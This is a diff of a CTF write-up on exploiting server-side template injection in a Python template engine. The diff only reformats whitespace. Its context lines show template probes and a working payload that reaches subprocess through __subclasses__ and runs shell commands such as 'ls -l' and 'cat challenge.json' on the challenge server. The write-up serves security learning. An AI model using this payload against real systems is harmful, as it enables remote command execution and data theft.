@@ -28,7 +28,7 @@ To go further I need to know which template engine is beeing used by the server.
 I started with this template : `{% raw %}{{ 1 + 2 }}{% endraw %}` which rendered as `3`. This allowed me to know that the templates are really beeing evaluated by the server.<br>
 Since the template engines I am the most familliar with are in Python I tried to check if it was the case here with the template `{% raw %}{{ ''.__class__ }}{% endraw %}` and it returned `<class 'str'>`. This proves that the template engine can execute Python code.
 
-## Executing commands 
+## Executing commands
 
 My goal is now to find a way to execute a command on the server.<br>
 This is a very similar situation to the last part of the squ1rrelmail challenge of squ1rrel CTF 2026 which has a writeup on this website. <br>
@@ -39,11 +39,13 @@ I then tried my first payload : `{% raw %}{{ ''.__class__.__mro__[1].__subclasse
 ## Finding the flag
 
 To determine the file I needed to read I ran a `ls -l` and it returned:
+
 ```
 b'total 16\n-rw-r--r-- 1 root root  210 May 12 18:11 Dockerfile\n-rw-r--r-- 1 root root 4388 Jun 14 10:57 README.md\n-rw-r--r-- 1 root root 2152 May 12 18:11 app.py\n-rw-r--r-- 1 root root  874 Jun 12 10:56 challenge.json\n-rwxr-xr-x 1 root root 1606 May 12 18:11 exploit.py\n-rw-r--r-- 1 root root  279 May 12 18:11 required_files.txt\n-rw-r--r-- 1 root root   13 May 12 18:11 requirements.txt\ndrwxr-xr-x 2 root root 4096 May 12 18:11 templates\n'
-``` 
+```
 
 Since this is not very readable as is (at least for me) I formated it with a simple Python `print` and got :
+
 ```bash
 total 16
 -rw-r--r-- 1 root root  210 May 12 18:11 Dockerfile
@@ -57,6 +59,7 @@ drwxr-xr-x 2 root root 4096 May 12 18:11 templates
 ```
 
 I got lucky again and started by reading `challenge.json`, with the full command beeing `{% raw %}{{ ''.__class__.__mro__[1].__subclasses__()[-1]('cat challenge.json', shell=True, stdout=-1).communicate()[0] }}{% endraw %}` and got (after formating) :
+
 ```json
 {
   "name": "Ghostbusters Template Possession",
